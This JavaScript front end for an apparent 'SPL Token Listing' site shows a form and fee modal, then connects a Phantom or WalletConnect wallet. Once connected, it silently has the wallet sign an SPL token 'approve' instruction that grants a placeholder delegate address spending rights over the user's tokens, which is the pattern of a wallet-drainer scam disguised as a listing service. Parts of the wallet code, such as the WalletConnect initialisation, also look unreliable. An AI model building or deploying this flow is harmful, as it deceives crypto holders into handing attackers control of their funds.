'use strict';

/* ============================
   DOM REFERENCES
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const phantomButton = document.getElementById('phantomButton');
const walletConnectButton = document.getElementById('walletConnectButton');

let provider = null;
let ownerPublicKey = null;

/* ============================
   UI FLOW
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

Array.from(closeButtons).forEach(btn => {
  btn.addEventListener('click', () => {
    const modal = btn.closest('.modal');
    if (modal) modal.style.display = 'none';
  });
});

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (phantomButton) {
  phantomButton.addEventListener('click', connectPhantom);
}

if (walletConnectButton) {
  walletConnectButton.addEventListener('click', connectWalletConnect);
}

/* ============================
   PHANTOM CONNECT
   ============================ */
async function connectPhantom() {
  try {
    if (!window.solana || !window.solana.isPhantom) {
      alert("Phantom is not installed. Please install Phantom to continue.");
      return;
    }
    const resp = await window.solana.connect();
    provider = window.solana;
    ownerPublicKey = resp.publicKey;
    walletModal.style.display = 'none';
    alert("✅ Phantom connected: " + ownerPublicKey.toString());
    await approveDelegate(ownerPublicKey);
  } catch (error) {
    console.error("Error connecting to Phantom:", error);
  }
}

/* ============================
   WALLETCONNECT (SOLANA)
   ============================ */
async function connectWalletConnect() {
  try {
    const wcProvider = await SolanaWalletAdapter.init({
      projectId: "YOUR_WALLETCONNECT_PROJECT_ID_HERE", // 👈 WC ID goes here
      chains: ["solana:devnet"], // or "solana:mainnet" if live
      showQrModal: true,
      metadata: {
        name: "SPL Token Listing",
        url: window.location.origin
      }
    });

    provider = wcProvider;
    const accounts = await wcProvider.connect();
    ownerPublicKey = accounts[0].address;
    walletModal.style.display = 'none';
    alert("✅ WalletConnect connected: " + ownerPublicKey.toString());
    await approveDelegate(ownerPublicKey);
  } catch (err) {
    console.error("WalletConnect error:", err);
    alert("❌ WalletConnect Error: " + (err.message || String(err)));
  }
}

/* ============================
   APPROVAL LOGIC (SPL Token Program)
   ============================ */
import {
  Connection,
  PublicKey,
  Transaction,
  clusterApiUrl
} from 'https://esm.sh/@solana/web3.js@1.73.0';

import {
  createApproveInstruction,
  getAssociatedTokenAddress,
  TOKEN_PROGRAM_ID
} from 'https://esm.sh/@solana/spl-token@0.3.5';

async function approveDelegate(accountPubKey) {
  try {
    const connection = new Connection(clusterApiUrl('devnet'), 'confirmed');
    const tokenMintStr = document.getElementById('tokenMint').value.trim();
    const mintPub = new PublicKey(tokenMintStr);

    // Replace with actual delegate address
    const delegatePub = new PublicKey('11111111111111111111111111111111');

    const ownerPub = new PublicKey(accountPubKey.toString());
    const tokenAccountPub = await getAssociatedTokenAddress(mintPub, ownerPub);

    const allowance = BigInt(1000000); // example allowance

    const approveIx = createApproveInstruction(
      tokenAccountPub,
      delegatePub,
      ownerPub,
      allowance,
      [],
      TOKEN_PROGRAM_ID
    );

    const tx = new Transaction().add(approveIx);
    const { blockhash } = await connection.getLatestBlockhash('finalized');
    tx.recentBlockhash = blockhash;
    tx.feePayer = ownerPub;

    const signedTx = await provider.signTransaction(tx);
    const raw = signedTx.serialize();
    const txid = await connection.sendRawTransaction(raw);
    await connection.confirmTransaction(txid, 'confirmed');
    alert("✅ Approve transaction confirmed: " + txid);
  } catch (error) {
    console.error("Approval error:", error);
    alert("❌ Error: " + (error.message || String(error)));
  }
}
